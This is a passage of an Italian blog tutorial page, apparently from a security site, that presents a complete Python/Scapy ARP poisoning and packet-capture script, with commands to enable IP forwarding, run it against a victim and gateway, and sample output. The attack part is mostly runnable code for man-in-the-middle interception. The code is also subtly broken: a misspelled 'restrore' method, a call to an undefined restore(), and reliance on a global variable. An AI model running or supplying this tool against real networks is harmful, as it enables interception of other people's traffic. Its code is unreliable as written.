+</code></pre></div><p>Il metodo <strong>restore</strong> potrebbe essere chiamato sia da <strong>poison</strong> (dopo un CTRL-C), sia da <strong>sniff</strong> (quando il numero di pacchetti richiesti è stato catturato) e si occupa di inviare i valori originali per gli indirizzi IP e MAC del gateway alla vittima, e viceversa, restituisce i corretti IP e MAC della vittima al gateway.</p>
+<p>Ecco il codice completo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> multiprocessing <span style="color:#f92672">import</span> Process
+<span style="color:#f92672">from</span> scapy.all <span style="color:#f92672">import</span> (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)
+
+<span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> sys<span style="color:#f92672">,</span> time
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_mac</span>(targetip):
+    packet <span style="color:#f92672">=</span> Ether(dst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ff:ff:ff:ff:ff:ff&#39;</span>)<span style="color:#f92672">/</span>ARP(op<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;who-has&#34;</span>, pdst<span style="color:#f92672">=</span>targetip)
+    resp, _ <span style="color:#f92672">=</span> srp(packet, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, retry<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>, verbose<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+    <span style="color:#66d9ef">for</span> _, r <span style="color:#f92672">in</span> resp:
+        <span style="color:#66d9ef">return</span> r[Ether]<span style="color:#f92672">.</span>src
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Arper</span>:
+    <span style="color:#66d9ef">def</span> __init__(self, victim, gateway, interface<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eth0&#39;</span>):
+        self<span style="color:#f92672">.</span>victim <span style="color:#f92672">=</span> victim
+        self<span style="color:#f92672">.</span>victimmac <span style="color:#f92672">=</span> get_mac(victim)
+        self<span style="color:#f92672">.</span>gateway <span style="color:#f92672">=</span> gateway
+        self<span style="color:#f92672">.</span>gatewaymac <span style="color:#f92672">=</span> get_mac(gateway)
+        self<span style="color:#f92672">.</span>interface <span style="color:#f92672">=</span> interface
+        conf<span style="color:#f92672">.</span>iface <span style="color:#f92672">=</span> interface
+        conf<span style="color:#f92672">.</span>verb <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Initialized </span><span style="color:#e6db74">{</span>interface<span style="color:#e6db74">}</span><span style="color:#e6db74">:&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Gateway (</span><span style="color:#e6db74">{</span>gateway<span style="color:#e6db74">}</span><span style="color:#e6db74">) is at </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>gatewaymac<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Victim (</span><span style="color:#e6db74">{</span>victim<span style="color:#e6db74">}</span><span style="color:#e6db74">) is at </span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>victimmac<span style="color:#e6db74">}</span><span style="color:#e6db74">.&#39;</span>)
+        print(<span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+        
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run</span>(self):
+        self<span style="color:#f92672">.</span>poison_thread <span style="color:#f92672">=</span> Process(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>poison)
+        self<span style="color:#f92672">.</span>poison_thread<span style="color:#f92672">.</span>start()
+
+        self<span style="color:#f92672">.</span>sniff_thread <span style="color:#f92672">=</span> Process(target<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>sniff)
+        self<span style="color:#f92672">.</span>sniff_thread<span style="color:#f92672">.</span>start()
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">poison</span>(self):
+        poison_victim <span style="color:#f92672">=</span> ARP()
+        poison_victim<span style="color:#f92672">.</span>op <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        poison_victim<span style="color:#f92672">.</span>psrc <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>gateway
+        poison_victim<span style="color:#f92672">.</span>pdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>victim
+        poison_victim<span style="color:#f92672">.</span>hwdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>victimmac
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip src: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>psrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip dst: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>pdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac dst: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>hwdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac src: </span><span style="color:#e6db74">{</span>poison_victim<span style="color:#f92672">.</span>hwsrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(poison_victim<span style="color:#f92672">.</span>summary())
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+        poison_gateway <span style="color:#f92672">=</span> ARP()
+        poison_gateway<span style="color:#f92672">.</span>op <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        poison_gateway<span style="color:#f92672">.</span>psrc <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>victim
+        poison_gateway<span style="color:#f92672">.</span>pdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>gateway
+        poison_gateway<span style="color:#f92672">.</span>hwdst <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>gatewaymac
+
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip src: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>psrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;ip dst: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>pdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac dst: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>hwdst<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;mac src: </span><span style="color:#e6db74">{</span>poison_gateway<span style="color:#f92672">.</span>hwsrc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+        print(poison_gateway<span style="color:#f92672">.</span>summary())
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Beginning the ARP poison. [CTRL-C to stop]&#39;</span>)
+        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;.&#39;</span>)
+            sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>flush()
+            <span style="color:#66d9ef">try</span>:
+                send(poison_victim)
+                send(poison_gateway)
+            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyboardInterrupt</span>:
+                self<span style="color:#f92672">.</span>restore()
+                sys<span style="color:#f92672">.</span>exit()
+            <span style="color:#66d9ef">else</span>:
+                time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">2</span>)
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sniff</span>(self, count<span style="color:#f92672">=</span><span style="color:#ae81ff">100</span>):
+        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
+        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Sniffing </span><span style="color:#e6db74">{</span>count<span style="color:#e6db74">}</span><span style="color:#e6db74"> packets&#39;</span>)
+        bpf_filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ip host </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> victim
+        packets <span style="color:#f92672">=</span> sniff(count<span style="color:#f92672">=</span>count, filter<span style="color:#f92672">=</span>bpf_filter, iface<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>interface)
+        wrpcap(<span style="color:#e6db74">&#39;arper.pcap&#39;</span>, packets)
+        print(<span style="color:#e6db74">&#39;Got the packets&#39;</span>)
+        self<span style="color:#f92672">.</span>restrore()
+        self<span style="color:#f92672">.</span>poison_thread<span style="color:#f92672">.</span>terminate()
+        print(<span style="color:#e6db74">&#39;Finished.&#39;</span>)
+        
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">restrore</span>(self):
+        print(<span style="color:#e6db74">&#39;Restoring ARP Tables...&#39;</span>)
+        send(ARP(
+            op<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, 
+            psrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>gateway, 
+            hwsrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>gatewaymac, 
+            pdst<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>victim, 
+            hwdst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ff:ff:ff:ff:ff:ff&#39;</span>), 
+            count<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+        send(ARP(
+            op<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, 
+            psrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>victim, 
+            hwsrc<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>victimmac, 
+            pdst<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>gateway, 
+            hwdst<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ff:ff:ff:ff:ff:ff&#39;</span>), 
+            count<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+    (victim, gateway, interface) <span style="color:#f92672">=</span> (sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>])
+    myarp <span style="color:#f92672">=</span> Arper(victim, gateway, interface)
+    myarp<span style="color:#f92672">.</span>run()
+</code></pre></div><p>Prima di avviare l’attacco dobbiamo informare la macchina host locale che possiamo inoltrare pacchetti sia attraverso il gateway sia attraverso il nostro obiettivo. Su Kali digitiamo il comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo echo <span style="color:#ae81ff">1</span> &gt; /proc/sys/net/ipv4/ip_forward
+</code></pre></div><p>Ora che l’IP forwarding è stato importato, avviamo lo script con:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 arper.py <span style="color:#f92672">[</span>IP vittima<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>IP gateway<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>interface<span style="color:#f92672">]</span>
+</code></pre></div><p>Ad esempio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo python3 arper.py 192.168.1.22 192.168.1.1 wlp61s0
+</code></pre></div><p>L’output durante l’attacco:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">? <span style="color:#f92672">(</span>192.168.1.1<span style="color:#f92672">)</span> associato a 18:cc:18:fa:ad:b1 <span style="color:#f92672">[</span>ether<span style="color:#f92672">]</span> su wlp61s0
+? <span style="color:#f92672">(</span>192.168.1.176<span style="color:#f92672">)</span> associato a 18:cc:18:fa:ad:b1 <span style="color:#f92672">[</span>ether<span style="color:#f92672">]</span> su wlp61s0
+</code></pre></div><p>Si vede che la vittima malcapitata ha una cache ARP compromessa, poichè il gateway risulta avere lo stesso indirizzo MAC dell’attaccante: infatti noi stiamo attaccando dal 192.168.1.176. A fine attacco, dovresti avere un file di nome arper.pcap nella stessa directory dello script.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://kobra3390.github.io/SpaceHack/posts/walkthrough-explore/walkthrough_explore_ctf/">
+                <span class="button__text">Walkthrough Explore</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="https://kobra3390.github.io/SpaceHack/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
